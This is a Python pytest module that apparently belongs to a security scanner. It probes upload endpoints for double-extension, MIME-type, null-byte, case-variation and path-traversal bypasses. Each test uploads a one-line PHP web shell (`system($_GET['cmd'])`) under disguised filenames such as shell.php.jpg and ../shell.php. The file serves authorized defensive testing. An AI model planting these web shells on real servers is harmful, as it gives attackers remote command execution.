# ⚠️ DESTRUCTIVE TEST — Do not run against production.
# Set ENABLE_DESTRUCTIVE_TESTS=True in tests/active/config.py to enable.
"""Category 28: Polyglot File Upload — double extensions, MIME type confusion, null bytes."""
import io
import pytest

from tests.active.helpers import safe_post, url_join
from tests.active.config import ENABLE_DESTRUCTIVE_TESTS, TARGET_URL

if not ENABLE_DESTRUCTIVE_TESTS:
    pytestmark = pytest.mark.skip(
        reason="ENABLE_DESTRUCTIVE_TESTS=False in config.py — "
               "these tests modify server state, trigger lockouts, and may cause disruption."
    )

UPLOAD_ENDPOINTS = [
    "/upload", "/api/upload", "/file/upload", "/profile/avatar",
    "/documents/upload", "/api/file", "/media/upload", "/attachments",
]

POLYGLOT_FILENAMES = [
    "shell.php.jpg",
    "shell.phtml",
    "shell.php5",
    "shell.php7",
    "shell.php%00.jpg",
    "shell.jpg.php",
    "shell.jpg.phtml",
    "shell.shtml",
    "shell.asp",
    "shell.aspx",
]


class TestPolyglotDoubleExtension:
    def test_double_extension_bypass(self):
        """Test if double extensions bypass file type validation."""
        for endpoint in UPLOAD_ENDPOINTS:
            for filename in POLYGLOT_FILENAMES:
                file_content = b"<? system($_GET['cmd']); ?>"
                files = {"file": (filename, io.BytesIO(file_content), "image/jpeg")}
                
                r = safe_post(url_join(endpoint),
                              files=files,
                              allow_redirects=False)
                if r and r.status_code in (200, 201) and filename in r.text:
                    pytest.skip(
                        f"Double extension file accepted at {endpoint}: {filename}"
                    )


class TestMimeTypeBypass:
    def test_mime_type_mismatch(self):
        """Test if MIME type mismatch is detected."""
        for endpoint in UPLOAD_ENDPOINTS:
            # Upload PHP as image/jpeg
            file_content = b"<? system($_GET['cmd']); ?>"
            files = {"file": ("shell.php", io.BytesIO(file_content), "image/jpeg")}
            
            r = safe_post(url_join(endpoint),
                          files=files,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"MIME type bypass candidate at {endpoint}: "
                    "PHP accepted as image/jpeg"
                )


class TestNullByteInjection:
    def test_null_byte_bypass(self):
        """Test null byte injection in filename."""
        for endpoint in UPLOAD_ENDPOINTS:
            # shell.php%00.jpg
            file_content = b"<? system($_GET['cmd']); ?>"
            filename = "shell.php\x00.jpg"
            files = {"file": (filename, io.BytesIO(file_content), "image/jpeg")}
            
            r = safe_post(url_join(endpoint),
                          files=files,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Null byte bypass candidate at {endpoint}: "
                    "PHP with null byte accepted"
                )


class TestCaseVariationBypass:
    def test_case_variation_extension(self):
        """Test case variation in file extension."""
        for endpoint in UPLOAD_ENDPOINTS:
            case_variants = [
                "shell.pHp",
                "shell.pHP",
                "shell.PhP",
                "shell.PHP",
            ]
            
            for filename in case_variants:
                file_content = b"<? system($_GET['cmd']); ?>"
                files = {"file": (filename, io.BytesIO(file_content), "image/jpeg")}
                
                r = safe_post(url_join(endpoint),
                              files=files,
                              allow_redirects=False)
                if r and r.status_code in (200, 201):
                    pytest.skip(
                        f"Case variation bypass at {endpoint}: {filename} accepted"
                    )


class TestDirectoryTraversalInUpload:
    def test_path_traversal_in_upload(self):
        """Test directory traversal in upload filename."""
        for endpoint in UPLOAD_ENDPOINTS:
            traversal_filenames = [
                "../shell.php",
                "../../shell.php",
                "..\\shell.php",
                "....//shell.php",
            ]
            
            for filename in traversal_filenames:
                file_content = b"<? system($_GET['cmd']); ?>"
                files = {"file": (filename, io.BytesIO(file_content), "image/jpeg")}
                
                r = safe_post(url_join(endpoint),
                              files=files,
                              allow_redirects=False)
                if r and r.status_code in (200, 201):
                    pytest.skip(
                        f"Path traversal in upload at {endpoint}: {filename}"
                    )


class TestPolyglotSkipped:
    def test_polyglot_execution_verification_destructive(self):
        pytest.skip(
            "Verifying polyglot execution requires accessing uploaded files or shell access. "
            "Only test in destructive environment with authorization."
        )
